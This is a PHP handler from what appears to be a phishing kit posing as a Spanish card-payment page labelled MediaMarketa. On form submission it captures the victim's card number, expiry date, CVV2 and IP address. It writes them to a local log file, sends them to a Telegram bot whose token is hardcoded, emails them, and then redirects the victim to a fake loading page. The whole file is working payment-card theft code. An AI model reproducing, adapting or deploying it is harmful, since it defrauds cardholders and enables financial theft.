<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['Sis_Numero_Tarjeta']) and !empty($_POST['Sis_Caducidad_Tarjeta_Mes']) and !empty($_POST['Sis_Caducidad_Tarjeta_Anno']) and !empty($_POST['Sis_Tarjeta_CVV2']) 
		// and !empty($_POST['pin'])
	) {
			$_SESSION['cc2']=$_POST['Sis_Numero_Tarjeta'];
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            $message = "CC 2 :" . $_POST['Sis_Numero_Tarjeta'] . "\nEXP :" . $_POST['Sis_Caducidad_Tarjeta_Mes'] ."/". $_POST['Sis_Caducidad_Tarjeta_Anno'] ."\nCVV :" . $_POST['Sis_Tarjeta_CVV2'] . "\n" . $ip . "\n*****************************\n";
            $file = fopen("./Corroes.txt", "a+");
            fwrite($file, $message);
            fclose($file);
			$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1097743075&text=t=" . urlencode($message)."" );
			$subject = "MediaMarketa_CC : $ip";
			$headers = "From:Info <ashraftaku@outlook.fr>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			mail($to, $subject, $message, $headers);
			
			
			
        header("Location: Seleccione_medio_de_codigo_loading2.php?codigo_id=".md5($_GET['error']));
    }
}
?>